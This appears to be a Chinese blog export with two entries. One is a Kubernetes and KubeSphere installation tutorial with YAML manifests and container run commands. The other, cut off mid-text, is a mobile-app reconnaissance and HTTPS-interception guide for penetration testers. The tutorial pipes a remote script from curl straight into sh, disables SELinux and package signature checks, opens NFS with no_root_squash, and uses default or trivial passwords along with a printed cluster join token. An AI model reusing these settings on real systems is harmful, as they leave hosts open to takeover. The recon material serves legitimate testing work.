一.安装Dockersudo yum remove docker*sudo yum install -y yum-utils#配置docker的yum地址sudo yum-config-manager \--add-repo \http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo#安装指定版本sudo yum install -y docker-ce-20.10.7 docker-ce-cli-20.10.7 containerd.io-1.4.6#	启动&amp;开机启动dockersystemctl enable docker --now# docker加速配置sudo mkdir -p /etc/dockersudo tee /etc/docker/daemon.json &lt;&lt;-&#x27;EOF&#x27;&#123;  &quot;registry-mirrors&quot;: [&quot;https://82m9ar63.mirror.aliyuncs.com&quot;],  &quot;exec-opts&quot;: [&quot;native.cgroupdriver=systemd&quot;],  &quot;log-driver&quot;: &quot;json-file&quot;,  &quot;log-opts&quot;: &#123;    &quot;max-size&quot;: &quot;100m&quot;  &#125;,  &quot;storage-driver&quot;: &quot;overlay2&quot;&#125;EOFsudo systemctl daemon-reloadsudo systemctl restart docker

二.安装kubernetes1.基本环境每个机器使用内网ip互通
每个机器配置自己的hostname，不能用localhost
#设置每个机器自己的hostnamehostnamectl set-hostname xxx# 将 SELinux 设置为 permissive 模式（相当于将其禁用）sudo setenforce 0sudo sed -i &#x27;s/^SELINUX=enforcing$/SELINUX=permissive/&#x27; /etc/selinux/config#关闭swapswapoff -a  sed -ri &#x27;s/.*swap.*/#&amp;/&#x27; /etc/fstab#允许 iptables 检查桥接流量cat &lt;&lt;EOF | sudo tee /etc/modules-load.d/k8s.confbr_netfilterEOFcat &lt;&lt;EOF | sudo tee /etc/sysctl.d/k8s.confnet.bridge.bridge-nf-call-ip6tables = 1net.bridge.bridge-nf-call-iptables = 1EOFsudo sysctl --system

2.安装kubelet.kubeadm.kubectl#配置k8s的yum源地址cat &lt;&lt;EOF | sudo tee /etc/yum.repos.d/kubernetes.repo[kubernetes]name=Kubernetesbaseurl=http://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64enabled=1gpgcheck=0repo_gpgcheck=0gpgkey=http://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpg   http://mirrors.aliyun.com/kubernetes/yum/doc/rpm-package-key.gpgEOF#安装 kubelet，kubeadm，kubectlsudo yum install -y kubelet-1.20.9 kubeadm-1.20.9 kubectl-1.20.9#启动kubeletsudo systemctl enable --now kubelet#所有机器配置master域名echo &quot;172.31.0.4  k8s-master&quot; &gt;&gt; /etc/hosts

3.初始化master节点①初始化kubeadm init \--apiserver-advertise-address=172.31.0.4 \--control-plane-endpoint=k8s-master \--image-repository registry.cn-hangzhou.aliyuncs.com/lfy_k8s_images \--kubernetes-version v1.20.9 \--service-cidr=10.96.0.0/16 \--pod-network-cidr=192.168.0.0/16

②记录关键信息记录master执行完成后的日志
Your Kubernetes control-plane has initialized successfully!To start using your cluster, you need to run the following as a regular user:  mkdir -p $HOME/.kube  sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config  sudo chown $(id -u):$(id -g) $HOME/.kube/configAlternatively, if you are the root user, you can run:  export KUBECONFIG=/etc/kubernetes/admin.confYou should now deploy a pod network to the cluster.Run &quot;kubectl apply -f [podnetwork].yaml&quot; with one of the options listed at:  https://kubernetes.io/docs/concepts/cluster-administration/addons/You can now join any number of control-plane nodes by copying certificate authoritiesand service account keys on each node and then running the following as root:  kubeadm join k8s-master:6443 --token 3vckmv.lvrl05xpyftbs177 \    --discovery-token-ca-cert-hash sha256:1dc274fed24778f5c284229d9fcba44a5df11efba018f9664cf5e8ff77907240 \    --control-plane Then you can join any number of worker nodes by running the following on each as root:kubeadm join k8s-master:6443 --token 3vckmv.lvrl05xpyftbs177 \    --discovery-token-ca-cert-hash sha256:1dc274fed24778f5c284229d9fcba44a5df11efba018f9664cf5e8ff77907240

③安装calicocurl https://docs.projectcalico.org/manifests/calico.yaml -Okubectl apply -f calico.yaml

4、加入worker节点三.安装kubeSphere前置环境1.nfs文件系统①安装nfs-server# 在每个机器。yum install -y nfs-utils# 在master 执行以下命令 echo &quot;/nfs/data/ *(insecure,rw,sync,no_root_squash)&quot; &gt; /etc/exports# 执行以下命令，启动 nfs 服务;创建共享目录mkdir -p /nfs/data# 在master执行systemctl enable rpcbindsystemctl enable nfs-serversystemctl start rpcbindsystemctl start nfs-server# 使配置生效exportfs -r#检查配置是否生效exportfs

②配置nfs-lientshowmount -e 172.31.0.4mkdir -p /nfs/datamount -t nfs 172.31.0.4:/nfs/data /nfs/data

③配置默认存储配置动态供应的默认存储类
## 创建了一个存储类apiVersion: storage.k8s.io/v1kind: StorageClassmetadata:  name: nfs-storage  annotations:    storageclass.kubernetes.io/is-default-class: &quot;true&quot;provisioner: k8s-sigs.io/nfs-subdir-external-provisionerparameters:  archiveOnDelete: &quot;true&quot;  ## 删除pv的时候，pv的内容是否要备份---apiVersion: apps/v1kind: Deploymentmetadata:  name: nfs-client-provisioner  labels:    app: nfs-client-provisioner  # replace with namespace where provisioner is deployed  namespace: defaultspec:  replicas: 1  strategy:    type: Recreate  selector:    matchLabels:      app: nfs-client-provisioner  template:    metadata:      labels:        app: nfs-client-provisioner    spec:      serviceAccountName: nfs-client-provisioner      containers:        - name: nfs-client-provisioner          image: registry.cn-hangzhou.aliyuncs.com/lfy_k8s_images/nfs-subdir-external-provisioner:v4.0.2          # resources:          #    limits:          #      cpu: 10m          #    requests:          #      cpu: 10m          volumeMounts:            - name: nfs-client-root              mountPath: /persistentvolumes          env:            - name: PROVISIONER_NAME              value: k8s-sigs.io/nfs-subdir-external-provisioner            - name: NFS_SERVER              value: 172.31.0.4 ## 指定自己nfs服务器地址            - name: NFS_PATH                value: /nfs/data  ## nfs服务器共享的目录      volumes:        - name: nfs-client-root          nfs:            server: 172.31.0.4            path: /nfs/data---apiVersion: v1kind: ServiceAccountmetadata:  name: nfs-client-provisioner  # replace with namespace where provisioner is deployed  namespace: default---kind: ClusterRoleapiVersion: rbac.authorization.k8s.io/v1metadata:  name: nfs-client-provisioner-runnerrules:  - apiGroups: [&quot;&quot;]    resources: [&quot;nodes&quot;]    verbs: [&quot;get&quot;, &quot;list&quot;, &quot;watch&quot;]  - apiGroups: [&quot;&quot;]    resources: [&quot;persistentvolumes&quot;]    verbs: [&quot;get&quot;, &quot;list&quot;, &quot;watch&quot;, &quot;create&quot;, &quot;delete&quot;]  - apiGroups: [&quot;&quot;]    resources: [&quot;persistentvolumeclaims&quot;]    verbs: [&quot;get&quot;, &quot;list&quot;, &quot;watch&quot;, &quot;update&quot;]  - apiGroups: [&quot;storage.k8s.io&quot;]    resources: [&quot;storageclasses&quot;]    verbs: [&quot;get&quot;, &quot;list&quot;, &quot;watch&quot;]  - apiGroups: [&quot;&quot;]    resources: [&quot;events&quot;]    verbs: [&quot;create&quot;, &quot;update&quot;, &quot;patch&quot;]---kind: ClusterRoleBindingapiVersion: rbac.authorization.k8s.io/v1metadata:  name: run-nfs-client-provisionersubjects:  - kind: ServiceAccount    name: nfs-client-provisioner    # replace with namespace where provisioner is deployed    namespace: defaultroleRef:  kind: ClusterRole  name: nfs-client-provisioner-runner  apiGroup: rbac.authorization.k8s.io---kind: RoleapiVersion: rbac.authorization.k8s.io/v1metadata:  name: leader-locking-nfs-client-provisioner  # replace with namespace where provisioner is deployed  namespace: defaultrules:  - apiGroups: [&quot;&quot;]    resources: [&quot;endpoints&quot;]    verbs: [&quot;get&quot;, &quot;list&quot;, &quot;watch&quot;, &quot;create&quot;, &quot;update&quot;, &quot;patch&quot;]---kind: RoleBindingapiVersion: rbac.authorization.k8s.io/v1metadata:  name: leader-locking-nfs-client-provisioner  # replace with namespace where provisioner is deployed  namespace: defaultsubjects:  - kind: ServiceAccount    name: nfs-client-provisioner    # replace with namespace where provisioner is deployed    namespace: defaultroleRef:  kind: Role  name: leader-locking-nfs-client-provisioner  apiGroup: rbac.authorization.k8s.io

#确认配置是否生效kubectl get sc

2.metrics-server集群指标监控系统
apiVersion: v1kind: ServiceAccountmetadata:  labels:    k8s-app: metrics-server  name: metrics-server  namespace: kube-system---apiVersion: rbac.authorization.k8s.io/v1kind: ClusterRolemetadata:  labels:    k8s-app: metrics-server    rbac.authorization.k8s.io/aggregate-to-admin: &quot;true&quot;    rbac.authorization.k8s.io/aggregate-to-edit: &quot;true&quot;    rbac.authorization.k8s.io/aggregate-to-view: &quot;true&quot;  name: system:aggregated-metrics-readerrules:- apiGroups:  - metrics.k8s.io  resources:  - pods  - nodes  verbs:  - get  - list  - watch---apiVersion: rbac.authorization.k8s.io/v1kind: ClusterRolemetadata:  labels:    k8s-app: metrics-server  name: system:metrics-serverrules:- apiGroups:  - &quot;&quot;  resources:  - pods  - nodes  - nodes/stats  - namespaces  - configmaps  verbs:  - get  - list  - watch---apiVersion: rbac.authorization.k8s.io/v1kind: RoleBindingmetadata:  labels:    k8s-app: metrics-server  name: metrics-server-auth-reader  namespace: kube-systemroleRef:  apiGroup: rbac.authorization.k8s.io  kind: Role  name: extension-apiserver-authentication-readersubjects:- kind: ServiceAccount  name: metrics-server  namespace: kube-system---apiVersion: rbac.authorization.k8s.io/v1kind: ClusterRoleBindingmetadata:  labels:    k8s-app: metrics-server  name: metrics-server:system:auth-delegatorroleRef:  apiGroup: rbac.authorization.k8s.io  kind: ClusterRole  name: system:auth-delegatorsubjects:- kind: ServiceAccount  name: metrics-server  namespace: kube-system---apiVersion: rbac.authorization.k8s.io/v1kind: ClusterRoleBindingmetadata:  labels:    k8s-app: metrics-server  name: system:metrics-serverroleRef:  apiGroup: rbac.authorization.k8s.io  kind: ClusterRole  name: system:metrics-serversubjects:- kind: ServiceAccount  name: metrics-server  namespace: kube-system---apiVersion: v1kind: Servicemetadata:  labels:    k8s-app: metrics-server  name: metrics-server  namespace: kube-systemspec:  ports:  - name: https    port: 443    protocol: TCP    targetPort: https  selector:    k8s-app: metrics-server---apiVersion: apps/v1kind: Deploymentmetadata:  labels:    k8s-app: metrics-server  name: metrics-server  namespace: kube-systemspec:  selector:    matchLabels:      k8s-app: metrics-server  strategy:    rollingUpdate:      maxUnavailable: 0  template:    metadata:      labels:        k8s-app: metrics-server    spec:      containers:      - args:        - --cert-dir=/tmp        - --kubelet-insecure-tls        - --secure-port=4443        - --kubelet-preferred-address-types=InternalIP,ExternalIP,Hostname        - --kubelet-use-node-status-port        image: registry.cn-hangzhou.aliyuncs.com/lfy_k8s_images/metrics-server:v0.4.3        imagePullPolicy: IfNotPresent        livenessProbe:          failureThreshold: 3          httpGet:            path: /livez            port: https            scheme: HTTPS          periodSeconds: 10        name: metrics-server        ports:        - containerPort: 4443          name: https          protocol: TCP        readinessProbe:          failureThreshold: 3          httpGet:            path: /readyz            port: https            scheme: HTTPS          periodSeconds: 10        securityContext:          readOnlyRootFilesystem: true          runAsNonRoot: true          runAsUser: 1000        volumeMounts:        - mountPath: /tmp          name: tmp-dir      nodeSelector:        kubernetes.io/os: linux      priorityClassName: system-cluster-critical      serviceAccountName: metrics-server      volumes:      - emptyDir: &#123;&#125;        name: tmp-dir---apiVersion: apiregistration.k8s.io/v1kind: APIServicemetadata:  labels:    k8s-app: metrics-server  name: v1beta1.metrics.k8s.iospec:  group: metrics.k8s.io  groupPriorityMinimum: 100  insecureSkipTLSVerify: true  service:    name: metrics-server    namespace: kube-system  version: v1beta1  versionPriority: 100

四.安装kuberspherehttps://kubesphere.com.cn/
1.下载核心文件如过下载不到，复制附录内容
wget https://github.com/kubesphere/ks-installer/releases/download/v3.1.1/kubesphere-installer.yamlwget https://github.com/kubesphere/ks-installer/releases/download/v3.1.1/cluster-configuration.yaml

2、修改cluster-configuration在cluster-configuration.yaml中开启我们需要的功能
参照官网“启用可插拔组件” 
https://kubesphere.com.cn/docs/pluggable-components/overview/
3.执行安装kubectl apply -f kubesphere-installer.yamlkubectl apply -f cluster-configuration.yaml

4.查看安装进度kubectl logs -n kubesphere-system $(kubectl get pod -n kubesphere-system -l app=ks-install -o jsonpath=&#x27;&#123;.items[0].metadata.name&#125;&#x27;) -f

访问任意机器的 30880端口
账号 ： admin
密码 ： P@88w0rd
解决etcd监控证书找不到问题
kubectl -n kubesphere-monitoring-system create secret generic kube-etcd-client-certs  --from-file=etcd-client-ca.crt=/etc/kubernetes/pki/etcd/ca.crt  --from-file=etcd-client.crt=/etc/kubernetes/pki/apiserver-etcd-client.crt  --from-file=etcd-client.key=/etc/kubernetes/pki/apiserver-etcd-client.key

附录1、kubesphere-installer.yaml---apiVersion: apiextensions.k8s.io/v1beta1kind: CustomResourceDefinitionmetadata:  name: clusterconfigurations.installer.kubesphere.iospec:  group: installer.kubesphere.io  versions:  - name: v1alpha1    served: true    storage: true  scope: Namespaced  names:    plural: clusterconfigurations    singular: clusterconfiguration    kind: ClusterConfiguration    shortNames:    - cc---apiVersion: v1kind: Namespacemetadata:  name: kubesphere-system---apiVersion: v1kind: ServiceAccountmetadata:  name: ks-installer  namespace: kubesphere-system---apiVersion: rbac.authorization.k8s.io/v1kind: ClusterRolemetadata:  name: ks-installerrules:- apiGroups:  - &quot;&quot;  resources:  - &#x27;*&#x27;  verbs:  - &#x27;*&#x27;- apiGroups:  - apps  resources:  - &#x27;*&#x27;  verbs:  - &#x27;*&#x27;- apiGroups:  - extensions  resources:  - &#x27;*&#x27;  verbs:  - &#x27;*&#x27;- apiGroups:  - batch  resources:  - &#x27;*&#x27;  verbs:  - &#x27;*&#x27;- apiGroups:  - rbac.authorization.k8s.io  resources:  - &#x27;*&#x27;  verbs:  - &#x27;*&#x27;- apiGroups:  - apiregistration.k8s.io  resources:  - &#x27;*&#x27;  verbs:  - &#x27;*&#x27;- apiGroups:  - apiextensions.k8s.io  resources:  - &#x27;*&#x27;  verbs:  - &#x27;*&#x27;- apiGroups:  - tenant.kubesphere.io  resources:  - &#x27;*&#x27;  verbs:  - &#x27;*&#x27;- apiGroups:  - certificates.k8s.io  resources:  - &#x27;*&#x27;  verbs:  - &#x27;*&#x27;- apiGroups:  - devops.kubesphere.io  resources:  - &#x27;*&#x27;  verbs:  - &#x27;*&#x27;- apiGroups:  - monitoring.coreos.com  resources:  - &#x27;*&#x27;  verbs:  - &#x27;*&#x27;- apiGroups:  - logging.kubesphere.io  resources:  - &#x27;*&#x27;  verbs:  - &#x27;*&#x27;- apiGroups:  - jaegertracing.io  resources:  - &#x27;*&#x27;  verbs:  - &#x27;*&#x27;- apiGroups:  - storage.k8s.io  resources:  - &#x27;*&#x27;  verbs:  - &#x27;*&#x27;- apiGroups:  - admissionregistration.k8s.io  resources:  - &#x27;*&#x27;  verbs:  - &#x27;*&#x27;- apiGroups:  - policy  resources:  - &#x27;*&#x27;  verbs:  - &#x27;*&#x27;- apiGroups:  - autoscaling  resources:  - &#x27;*&#x27;  verbs:  - &#x27;*&#x27;- apiGroups:  - networking.istio.io  resources:  - &#x27;*&#x27;  verbs:  - &#x27;*&#x27;- apiGroups:  - config.istio.io  resources:  - &#x27;*&#x27;  verbs:  - &#x27;*&#x27;- apiGroups:  - iam.kubesphere.io  resources:  - &#x27;*&#x27;  verbs:  - &#x27;*&#x27;- apiGroups:  - notification.kubesphere.io  resources:  - &#x27;*&#x27;  verbs:  - &#x27;*&#x27;- apiGroups:  - auditing.kubesphere.io  resources:  - &#x27;*&#x27;  verbs:  - &#x27;*&#x27;- apiGroups:  - events.kubesphere.io  resources:  - &#x27;*&#x27;  verbs:  - &#x27;*&#x27;- apiGroups:  - core.kubefed.io  resources:  - &#x27;*&#x27;  verbs:  - &#x27;*&#x27;- apiGroups:  - installer.kubesphere.io  resources:  - &#x27;*&#x27;  verbs:  - &#x27;*&#x27;- apiGroups:  - storage.kubesphere.io  resources:  - &#x27;*&#x27;  verbs:  - &#x27;*&#x27;- apiGroups:  - security.istio.io  resources:  - &#x27;*&#x27;  verbs:  - &#x27;*&#x27;- apiGroups:  - monitoring.kiali.io  resources:  - &#x27;*&#x27;  verbs:  - &#x27;*&#x27;- apiGroups:  - kiali.io  resources:  - &#x27;*&#x27;  verbs:  - &#x27;*&#x27;- apiGroups:  - networking.k8s.io  resources:  - &#x27;*&#x27;  verbs:  - &#x27;*&#x27;- apiGroups:  - kubeedge.kubesphere.io  resources:  - &#x27;*&#x27;  verbs:  - &#x27;*&#x27;- apiGroups:  - types.kubefed.io  resources:  - &#x27;*&#x27;  verbs:  - &#x27;*&#x27;---kind: ClusterRoleBindingapiVersion: rbac.authorization.k8s.io/v1metadata:  name: ks-installersubjects:- kind: ServiceAccount  name: ks-installer  namespace: kubesphere-systemroleRef:  kind: ClusterRole  name: ks-installer  apiGroup: rbac.authorization.k8s.io---apiVersion: apps/v1kind: Deploymentmetadata:  name: ks-installer  namespace: kubesphere-system  labels:    app: ks-installspec:  replicas: 1  selector:    matchLabels:      app: ks-install  template:    metadata:      labels:        app: ks-install    spec:      serviceAccountName: ks-installer      containers:      - name: installer        image: kubesphere/ks-installer:v3.1.1        imagePullPolicy: &quot;Always&quot;        resources:          limits:            cpu: &quot;1&quot;            memory: 1Gi          requests:            cpu: 20m            memory: 100Mi        volumeMounts:        - mountPath: /etc/localtime          name: host-time      volumes:      - hostPath:          path: /etc/localtime          type: &quot;&quot;        name: host-time

2、cluster-configuration.yaml---apiVersion: installer.kubesphere.io/v1alpha1kind: ClusterConfigurationmetadata:  name: ks-installer  namespace: kubesphere-system  labels:    version: v3.1.1spec:  persistence:    storageClass: &quot;&quot;        # If there is no default StorageClass in your cluster, you need to specify an existing StorageClass here.  authentication:    jwtSecret: &quot;&quot;           # Keep the jwtSecret consistent with the Host Cluster. Retrieve the jwtSecret by executing &quot;kubectl -n kubesphere-system get cm kubesphere-config -o yaml | grep -v &quot;apiVersion&quot; | grep jwtSecret&quot; on the Host Cluster.  local_registry: &quot;&quot;        # Add your private registry address if it is needed.  etcd:    monitoring: true       # Enable or disable etcd monitoring dashboard installation. You have to create a Secret for etcd before you enable it.    endpointIps: 172.31.0.4  # etcd cluster EndpointIps. It can be a bunch of IPs here.    port: 2379              # etcd port.    tlsEnable: true  common:    redis:      enabled: true    openldap:      enabled: true    minioVolumeSize: 20Gi # Minio PVC size.    openldapVolumeSize: 2Gi   # openldap PVC size.    redisVolumSize: 2Gi # Redis PVC size.    monitoring:      # type: external   # Whether to specify the external prometheus stack, and need to modify the endpoint at the next line.      endpoint: http://prometheus-operated.kubesphere-monitoring-system.svc:9090 # Prometheus endpoint to get metrics data.    es:   # Storage backend for logging, events and auditing.      # elasticsearchMasterReplicas: 1   # The total number of master nodes. Even numbers are not allowed.      # elasticsearchDataReplicas: 1     # The total number of data nodes.      elasticsearchMasterVolumeSize: 4Gi   # The volume size of Elasticsearch master nodes.      elasticsearchDataVolumeSize: 20Gi    # The volume size of Elasticsearch data nodes.      logMaxAge: 7                     # Log retention time in built-in Elasticsearch. It is 7 days by default.      elkPrefix: logstash              # The string making up index names. The index name will be formatted as ks-&lt;elk_prefix&gt;-log.      basicAuth:        enabled: false        username: &quot;&quot;        password: &quot;&quot;      externalElasticsearchUrl: &quot;&quot;      externalElasticsearchPort: &quot;&quot;  console:    enableMultiLogin: true  # Enable or disable simultaneous logins. It allows different users to log in with the same account at the same time.    port: 30880  alerting:                # (CPU: 0.1 Core, Memory: 100 MiB) It enables users to customize alerting policies to send messages to receivers in time with different time intervals and alerting levels to choose from.    enabled: true         # Enable or disable the KubeSphere Alerting System.    # thanosruler:    #   replicas: 1    #   resources: &#123;&#125;  auditing:                # Provide a security-relevant chronological set of records，recording the sequence of activities happening on the platform, initiated by different tenants.    enabled: true         # Enable or disable the KubeSphere Auditing Log System.   devops:                  # (CPU: 0.47 Core, Memory: 8.6 G) Provide an out-of-the-box CI/CD system based on Jenkins, and automated workflow tools including Source-to-Image &amp; Binary-to-Image.    enabled: true             # Enable or disable the KubeSphere DevOps System.    jenkinsMemoryLim: 2Gi      # Jenkins memory limit.    jenkinsMemoryReq: 1500Mi   # Jenkins memory request.    jenkinsVolumeSize: 8Gi     # Jenkins volume size.    jenkinsJavaOpts_Xms: 512m  # The following three fields are JVM parameters.    jenkinsJavaOpts_Xmx: 512m    jenkinsJavaOpts_MaxRAM: 2g  events:                  # Provide a graphical web console for Kubernetes Events exporting, filtering and alerting in multi-tenant Kubernetes clusters.    enabled: true         # Enable or disable the KubeSphere Events System.    ruler:      enabled: true      replicas: 2  logging:                 # (CPU: 57 m, Memory: 2.76 G) Flexible logging functions are provided for log query, collection and management in a unified console. Additional log collectors can be added, such as Elasticsearch, Kafka and Fluentd.    enabled: true         # Enable or disable the KubeSphere Logging System.    logsidecar:      enabled: true      replicas: 2  metrics_server:                    # (CPU: 56 m, Memory: 44.35 MiB) It enables HPA (Horizontal Pod Autoscaler).    enabled: false                   # Enable or disable metrics-server.  monitoring:    storageClass: &quot;&quot;                 # If there is an independent StorageClass you need for Prometheus, you can specify it here. The default StorageClass is used by default.    # prometheusReplicas: 1          # Prometheus replicas are responsible for monitoring different segments of data source and providing high availability.    prometheusMemoryRequest: 400Mi   # Prometheus request memory.    prometheusVolumeSize: 20Gi       # Prometheus PVC size.    # alertmanagerReplicas: 1          # AlertManager Replicas.  multicluster:    clusterRole: none  # host | member | none  # You can install a solo cluster, or specify it as the Host or Member Cluster.  network:    networkpolicy: # Network policies allow network isolation within the same cluster, which means firewalls can be set up between certain instances (Pods).      # Make sure that the CNI network plugin used by the cluster supports NetworkPolicy. There are a number of CNI network plugins that support NetworkPolicy, including Calico, Cilium, Kube-router, Romana and Weave Net.      enabled: true # Enable or disable network policies.    ippool: # Use Pod IP Pools to manage the Pod network address space. Pods to be created can be assigned IP addresses from a Pod IP Pool.      type: calico # Specify &quot;calico&quot; for this field if Calico is used as your CNI plugin. &quot;none&quot; means that Pod IP Pools are disabled.    topology: # Use Service Topology to view Service-to-Service communication based on Weave Scope.      type: none # Specify &quot;weave-scope&quot; for this field to enable Service Topology. &quot;none&quot; means that Service Topology is disabled.  openpitrix: # An App Store that is accessible to all platform tenants. You can use it to manage apps across their entire lifecycle.    store:      enabled: true # Enable or disable the KubeSphere App Store.  servicemesh:         # (0.3 Core, 300 MiB) Provide fine-grained traffic management, observability and tracing, and visualized traffic topology.    enabled: true     # Base component (pilot). Enable or disable KubeSphere Service Mesh (Istio-based).  kubeedge:          # Add edge nodes to your cluster and deploy workloads on edge nodes.    enabled: true   # Enable or disable KubeEdge.    cloudCore:      nodeSelector: &#123;&quot;node-role.kubernetes.io/worker&quot;: &quot;&quot;&#125;      tolerations: []      cloudhubPort: &quot;10000&quot;      cloudhubQuicPort: &quot;10001&quot;      cloudhubHttpsPort: &quot;10002&quot;      cloudstreamPort: &quot;10003&quot;      tunnelPort: &quot;10004&quot;      cloudHub:        advertiseAddress: # At least a public IP address or an IP address which can be accessed by edge nodes must be provided.          - &quot;&quot;            # Note that once KubeEdge is enabled, CloudCore will malfunction if the address is not provided.        nodeLimit: &quot;100&quot;      service:        cloudhubNodePort: &quot;30000&quot;        cloudhubQuicNodePort: &quot;30001&quot;        cloudhubHttpsNodePort: &quot;30002&quot;        cloudstreamNodePort: &quot;30003&quot;        tunnelNodePort: &quot;30004&quot;    edgeWatcher:      nodeSelector: &#123;&quot;node-role.kubernetes.io/worker&quot;: &quot;&quot;&#125;      tolerations: []      edgeWatcherAgent:        nodeSelector: &#123;&quot;node-role.kubernetes.io/worker&quot;: &quot;&quot;&#125;        tolerations: []

Linux单节点部署KubeSphere一、开通服务器4c8g；centos7.9；防火墙放行  30000~32767；指定hostname
hostnamectl set-hostname node1

二、安装1.准备kubekeyexport KKZONE=cncurl -sfL https://get-kk.kubesphere.io | VERSION=v1.1.1 sh -chmod +x kk

2、使用KubeKey引导安装集群#可能需要下面命令yum install -y conntrack./kk create cluster --with-kubernetes v1.20.4 --with-kubesphere v3.1.1

3、安装后开启功能
Linux多节点部署KubeSphere一.准备三台服务器
4c8g （master）
8c16g * 2（worker）
centos7.9
内网互通
每个机器有自己域名
防火墙开放30000~32767端口

二.使用kuberkey创建集群1.下载kubekeyexport KKZONE=cncurl -sfL https://get-kk.kubesphere.io | VERSION=v1.1.1 sh -chmod +x kk

2.创建集群配置文件./kk create config --with-kubernetes v1.20.4 --with-kubesphere v3.1.1

3、创建集群./kk create cluster -f config-sample.yaml

4、查看进度kubectl logs -n kubesphere-system $(kubectl get pod -n kubesphere-system -l app=ks-install -o jsonpath=&#x27;&#123;.items[0].metadata.name&#125;&#x27;) -f

KubeSphere实战多租户系统实战

集群
企业空间
项目

中间件部署实战应用部署需要关注的信息【应用部署三要素】
1、应用的部署方式
2、应用的数据挂载（数据，配置文件）
3、应用的可访问性

一.部署mysql1.mysql容器启动docker run -p 3306:3306 --name mysql-01 \-v /mydata/mysql/log:/var/log/mysql \-v /mydata/mysql/data:/var/lib/mysql \-v /mydata/mysql/conf:/etc/mysql/conf.d \-e MYSQL_ROOT_PASSWORD=root \--restart=always \-d mysql:5.7 

2.mysql配置示例[client]default-character-set=utf8mb4 [mysql]default-character-set=utf8mb4 [mysqld]init_connect=&#x27;SET collation_connection = utf8mb4_unicode_ci&#x27;init_connect=&#x27;SET NAMES utf8mb4&#x27;character-set-server=utf8mb4collation-server=utf8mb4_unicode_ciskip-character-set-client-handshakeskip-name-resolve

3.mysql部署分析
1、集群内部，直接通过应用的  【服务名.项目名】 直接访问  
​        mysql -uroot -hhis-mysql-glgf.his -p 
2、集群外部

二.部署redis1. redis容器启动#创建配置文件## 1、准备redis配置文件内容mkdir -p /mydata/redis/conf &amp;&amp; vim /mydata/redis/conf/redis.conf##配置示例appendonly yesport 6379bind 0.0.0.0#docker启动redisdocker run -d -p 6379:6379 --restart=always \-v /mydata/redis/conf/redis.conf:/etc/redis/redis.conf \-v  /mydata/redis-01/data:/data \ --name redis-01 redis:6.2.5 \ redis-server /etc/redis/redis.conf

2.redis部署分析
三.部署ElasticSearch1.es容器启动# 创建数据目录mkdir -p /mydata/es-01 &amp;&amp; chmod 777 -R /mydata/es-01# 容器启动docker run --restart=always -d -p 9200:9200 -p 9300:9300 \-e &quot;discovery.type=single-node&quot; \-e ES_JAVA_OPTS=&quot;-Xms512m -Xmx512m&quot; \-v es-config:/usr/share/elasticsearch/config \-v /mydata/es-01/data:/usr/share/elasticsearch/data \--name es-01 \elasticsearch:7.13.4

2.部署分析
注意：子路径挂载，配置修改后，k8s不会对其pod内的相关配置文件进行热更新，需要自己重启Pod
四.应用商店
可以使用 dev-zhao 登录，从应用商店部署
五.
使用企业空间管理员（wuhan-boss）登录，设置应用仓库
学习Helm即可，去helm的应用市场添加一个仓库地址，比如：bitnami
Ruoyi部署实战nacos启动命令
单节点启动
startup.cmd -m standalone

ruoyi项目
#Terminalk控制台cd ruoyi-uinpm install --registry=https://registry.npmmirror.comset NODE_OPTIONS=--openssl-legacy-providernpm run dev

]]></content>
      <categories>
        <category>云计算</category>
        <category>基础知识</category>
      </categories>
      <tags>
        <tag>云计算</tag>
        <tag>云原生技术</tag>
      </tags>
  </entry>
  <entry>
    <title>老男孩--手机端信息收集及渗透(3)</title>
    <url>/posts/e33055a4.html</url>
    <content><![CDATA[——–APP———-APP资产收集APP中含有连接服务器的相关域名、IP等信息，通过相关工具即可实现提取
AppInfoScanner项目地址：kelvinBen&#x2F;AppInfoScanner
一款适用于以HW行动&#x2F;红队&#x2F;渗透测试团队为场景的移动端(Android、iOS、WEB、H5、静态网站)信息收集扫描工具，可以帮助渗透测试工程师、攻击队成员、红队成员快速收集到移动端或者静态WEB站点中关键的资产信息并提供基本的信息输出,如：Title、Domain、CDN、指纹信息、状态信息等。
使用配置：
cd AppInfoScannerpython -m pip install -r requirements.txt



运行方法：
#扫描Android应用的APK文件、DEX文件、需要下载的APK文件下载地址、保存需要扫描的文件的目录python app.py android -i &lt;Your APK File or DEX File or APK Download Url or Save File Dir&gt;#扫描iOS应用的IPA文件、Mach-o文件、需要下载的IPA文件下载地址、保存需要扫描的文件目录python app.py ios -i &lt;Your IPA file or Mach-o File or IPA Download Url or Save File Dir&gt;#扫描Web站点的文件、目录、需要缓存的站点URlpython app.py web -i &lt;Your Web file or Save Web Dir or Web Cache Url&gt;



信息提取较少
MobSF移动安全框架 （MobSF） 是一个适用于 Android、iOS 和 Windows Mobile 移动应用程序的安全研究平台。MobSF 可用于各种使用案例，例如移动应用程序安全、渗透测试、恶意软件分析和隐私分析。Static Analyzer 支持流行的移动应用程序二进制文件，如 APK、IPA、APPX 和源代码。同时，Dynamic Analyzer 支持 Android 和 iOS 应用程序，并为交互式插桩测试、运行时数据和网络流量分析提供了一个平台。MobSF 与您的 DevSecOps 或 CI&#x2F;CD 管道无缝集成，由 REST API 和 CLI 工具提供便利，轻松增强您的安全工作流程。
项目地址：MobSF&#x2F;Mobile-Security-Framework-MobSF
快速搭建：
docker pull opensecurity/mobile-security-framework-mobsf:latestdocker run -it --rm -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest# Default username and password: mobsf/mobsf



抓包实现HTTP&#x2F;S流量​	
1、Charles工具导出证书


​	将证书导出，推荐为cer后缀
2、Fidder导出证书


3、Burp导出证书




模拟器配置（夜神模拟器）：








将证书导入即可
配置代理：






其他流量抓不到数据包有两种情况：    1.反代理机制    2.证书问题
如果数据走的ssl https，那么数据包有三种验证情况：    情况1，客户端不存在证书校验，服务器也不存在证书校验。    情况2，客户端存在校验服务端证书，服务器也不存在证书校验，单项校验。    情况3、客户端存在证书校验，服务器也存在证书校验，双向校验。
开了浏览器后，访问baidu.com的话会一直提示，前提介绍到burp fiddler 需要配置模拟器安装证书才能抓取https（工具证书）访问这个app的接受服务器就相当于利用的是burp证书，和原来的app证书不一样，这样就是证书问题。校验不通过，存在异常的情况。怎么区别是反代理还是证书。最简单的方法是反编译，看反代理有没有代码。还可以自己推测。
反代理检测：1、自身的抓包应用用工具（packet capture）进行抓包，如果显示正常就证明是反代理，如果异常就是证书。这种是没有设置代理，只是抓包而已。
